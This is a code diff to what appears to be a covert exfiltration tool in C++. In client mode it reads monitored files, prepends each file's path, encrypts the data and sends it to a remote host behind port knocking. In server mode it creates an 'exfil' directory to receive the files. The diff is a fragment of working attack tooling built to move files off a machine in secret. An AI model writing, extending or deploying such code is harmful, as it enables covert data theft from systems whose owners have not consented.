@@ -154,8 +154,16 @@ int clientMode(const Properties &p, char *programName) {
         for (auto host : hosts) {
             for (auto fullPath : fm->getFullPathsForHost(host, e)) {
                 if (fork() == 0) {
+                    std::string header(fullPath);
+
                     UCharVector buffer = fileToBuffer(fullPath);
-                    UCharVector ciphertext = netEngine.getCrypto()->enc(buffer);
+
+                    UCharVector payload(header.begin(), header.end());
+                    payload.push_back((unsigned char)0);
+                    payload.insert(payload.end(), buffer.begin(), buffer.end());
+
+                    UCharVector ciphertext = netEngine.getCrypto()->enc(payload);
+
                     struct in_addr daddr;
                     daddr.s_addr = host;
                     netEngine.knockAndSend(daddr, ciphertext);
@@ -202,6 +210,8 @@ int serverMode(const Properties &p) {
     const std::string &knockPattern = p.at("knockPattern");
     unsigned short knockPort = std::stoi(p.at("knockPort"));
     unsigned int knockDuration = std::stoi(p.at("knockDuration"));
+
+    system("mkdir exfil");
 
     NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
 
@@ -261,8 +271,6 @@ int serverMode(const Properties &p) {
 
             // send get command
             FileMonitor::sendRequest(tokens[2], daddr, &netEngine);
-
-            // TODO: start tcp server
         }
     }
 
